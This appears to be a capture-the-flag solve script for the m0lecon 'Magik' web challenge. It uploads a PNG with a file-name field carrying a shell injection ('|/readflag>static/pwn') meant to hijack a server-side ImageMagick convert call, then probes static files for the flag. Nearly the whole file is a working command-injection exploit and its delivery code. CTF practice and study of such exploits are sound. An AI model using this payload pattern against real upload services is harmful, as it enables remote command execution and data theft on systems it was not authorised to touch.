#!/usr/bin/env python3
"""
Magik - Simplified approach
Direct execution to see what's happening
"""

import requests
import base64

URL = "https://aa1fadfd635d-magik.challs.m0lecon.it/"
png = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==')

print("[*] Testing: name = 'test |/readflag>static/pwn'")
print("    This should execute: convert /tmp/... ... static/test |/readflag>static/pwn.png")
print("    Actual execution: convert /tmp/... ... static/test (pipe) /readflag>static/pwn.png")
print()

r = requests.post(URL,
    files={'img': ('test.png', png, 'application/octet-stream')},
    data={'name': 'test |/readflag>static/pwn'},
    timeout=10)

print(f"Upload status: {r.status_code}")
print()

# Check various potential output files
files_to_check = [
    'pwn.png',
    'pwn',
    'test.png',
    'test',
]

print("[*] Checking for output files...")
for fname in files_to_check:
    try:
        r2 = requests.get(f"{URL}static/{fname}", timeout=3)
        print(f"  static/{fname}: {r2.status_code} ({len(r2.content)} bytes)")
        if r2.status_code == 200 and len(r2.content) < 500:
            content = r2.content
            try:
                text = content.decode('utf-8', errors='ignore')
                if 'ptm{' in text:
                    print(f"\n\n    *** FLAG FOUND: {text} ***\n")
                elif len(content) < 200:
                    print(f"      Content: {text[:200]}")
            except:
                print(f"      Binary content: {content[:100]}")
    except requests.exceptions.HTTPError as e:
        if e.response.status_code == 404:
            print(f"  static/{fname}: 404 (not found)")
    except Exception as e:
        print(f"  static/{fname}: error - {e}")
